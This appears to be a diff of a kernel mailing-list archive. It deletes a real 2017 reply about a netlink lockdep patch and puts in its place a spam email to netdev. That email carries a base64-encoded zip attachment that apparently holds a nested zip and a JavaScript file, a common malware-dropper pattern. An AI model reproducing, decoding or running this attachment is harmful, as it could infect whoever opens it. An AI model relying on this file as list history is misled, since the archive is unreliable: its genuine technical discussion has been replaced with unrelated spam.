@@ -1,112 +1,101 @@
-From: Dmitry Vyukov <dvyukov@google.com>
-Subject: Re: crypto: deadlock between crypto_alg_sem/rtnl_mutex/genl_mutex
-Date: Tue, 14 Mar 2017 11:31:05 +0100
-Message-ID: <CACT4Y+bzAdkwKgNHZ2PXvJFvm0h2uFYtnjhwCWW1HNOki9=hEA@mail.gmail.com>
-References: <CACT4Y+bLbNbf0T376JHvemuY+za0+qgrfOKWzvJg5vAkJTCRFg@mail.gmail.com>
- <20170314091649.GA711@gondor.apana.org.au> <CACT4Y+YT6EZFtMTNywd4BtKyzWrJ9vtDU96TUFi9WLpypkgWhg@mail.gmail.com>
- <20170314102557.GA1225@gondor.apana.org.au>
+From: <stef.ryckmans@kortenberg.be>
+Subject: 40728 netdev
+Date: Tue, 14 Mar 2017 10:37:31 -0000
+Message-ID: <148948785144.15433.1283985964604354473@moscow.rt.ru>
+Reply-To: <stef.ryckmans@kortenberg.be>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Cc: David Miller <davem@davemloft.net>, linux-crypto@vger.kernel.org,
-        LKML <linux-kernel@vger.kernel.org>,
-        Eric Dumazet <edumazet@google.com>,
-        Cong Wang <xiyou.wangcong@gmail.com>,
-        netdev <netdev@vger.kernel.org>,
-        syzkaller <syzkaller@googlegroups.com>
-To: Herbert Xu <herbert@gondor.apana.org.au>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <20170314102557.GA1225@gondor.apana.org.au>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: netdev.vger.kernel.org
+Content-Type: application/zip; name="98.zip"
+Content-Transfer-Encoding: base64
+To: "netdev" <netdev@vger.kernel.org>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from broadband-5-228-163-168.moscow.rt.ru ([5.228.163.168]:59537
+        "HELO moscow.rt.ru" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org
+        with SMTP id S1750771AbdCNKhf (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Tue, 14 Mar 2017 06:37:35 -0400
+Content-Disposition: attachment
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-On Tue, Mar 14, 2017 at 11:25 AM, Herbert Xu
-<herbert@gondor.apana.org.au> wrote:
-> On Tue, Mar 14, 2017 at 10:44:10AM +0100, Dmitry Vyukov wrote:
->>
->> Yes, please.
->> Disregarding some reports is not a good way long term.
->
-> Please try this patch.
-
-Applied on bots. I should have a conclusion within a day.
-Thanks!
-
-
-> ---8<---
-> Subject: netlink: Annotate nlk cb_mutex by protocol
->
-> Currently all occurences of nlk->cb_mutex are annotated by lockdep
-> as a single class.  This causes a false lcokdep cycle involving
-> genl and crypto_user.
->
-> This patch fixes it by dividing cb_mutex into individual classes
-> based on the netlink protocol.  As genl and crypto_user do not
-> use the same netlink protocol this breaks the false dependency
-> loop.
->
-> Reported-by: Dmitry Vyukov <dvyukov@google.com>
-> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>
->
-> diff --git a/net/netlink/af_netlink.c b/net/netlink/af_netlink.c
-> index 7b73c7c..596eaff 100644
-> --- a/net/netlink/af_netlink.c
-> +++ b/net/netlink/af_netlink.c
-> @@ -96,6 +96,44 @@ static inline int netlink_is_kernel(struct sock *sk)
->
->  static DECLARE_WAIT_QUEUE_HEAD(nl_table_wait);
->
-> +static struct lock_class_key nlk_cb_mutex_keys[MAX_LINKS];
-> +
-> +static const char *const nlk_cb_mutex_key_strings[MAX_LINKS + 1] = {
-> +       "nlk_cb_mutex-ROUTE",
-> +       "nlk_cb_mutex-1",
-> +       "nlk_cb_mutex-USERSOCK",
-> +       "nlk_cb_mutex-FIREWALL",
-> +       "nlk_cb_mutex-SOCK_DIAG",
-> +       "nlk_cb_mutex-NFLOG",
-> +       "nlk_cb_mutex-XFRM",
-> +       "nlk_cb_mutex-SELINUX",
-> +       "nlk_cb_mutex-ISCSI",
-> +       "nlk_cb_mutex-AUDIT",
-> +       "nlk_cb_mutex-FIB_LOOKUP",
-> +       "nlk_cb_mutex-CONNECTOR",
-> +       "nlk_cb_mutex-NETFILTER",
-> +       "nlk_cb_mutex-IP6_FW",
-> +       "nlk_cb_mutex-DNRTMSG",
-> +       "nlk_cb_mutex-KOBJECT_UEVENT",
-> +       "nlk_cb_mutex-GENERIC",
-> +       "nlk_cb_mutex-17",
-> +       "nlk_cb_mutex-SCSITRANSPORT",
-> +       "nlk_cb_mutex-ECRYPTFS",
-> +       "nlk_cb_mutex-RDMA",
-> +       "nlk_cb_mutex-CRYPTO",
-> +       "nlk_cb_mutex-SMC",
-> +       "nlk_cb_mutex-23",
-> +       "nlk_cb_mutex-24",
-> +       "nlk_cb_mutex-25",
-> +       "nlk_cb_mutex-26",
-> +       "nlk_cb_mutex-27",
-> +       "nlk_cb_mutex-28",
-> +       "nlk_cb_mutex-29",
-> +       "nlk_cb_mutex-30",
-> +       "nlk_cb_mutex-31",
-> +       "nlk_cb_mutex-MAX_LINKS"
-> +};
-> +
->  static int netlink_dump(struct sock *sk);
->  static void netlink_skb_destructor(struct sk_buff *skb);
->
-> @@ -585,6 +623,9 @@ static int __netlink_create(struct net *net, struct socket *sock,
->         } else {
->                 nlk->cb_mutex = &nlk->cb_def_mutex;
->                 mutex_init(nlk->cb_mutex);
-> +               lockdep_set_class_and_name(nlk->cb_mutex,
-> +                                          nlk_cb_mutex_keys + protocol,
-> +                                          nlk_cb_mutex_key_strings[protocol]);
->         }
->         init_waitqueue_head(&nlk->wait);
->
-> --
-> Email: Herbert Xu <herbert@gondor.apana.org.au>
-> Home Page: http://gondor.apana.org.au/~herbert/
-> PGP Key: http://gondor.apana.org.au/~herbert/pubkey.txt
+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
+BQYAAAAAAQABAFMAAADtEQAAAAA=
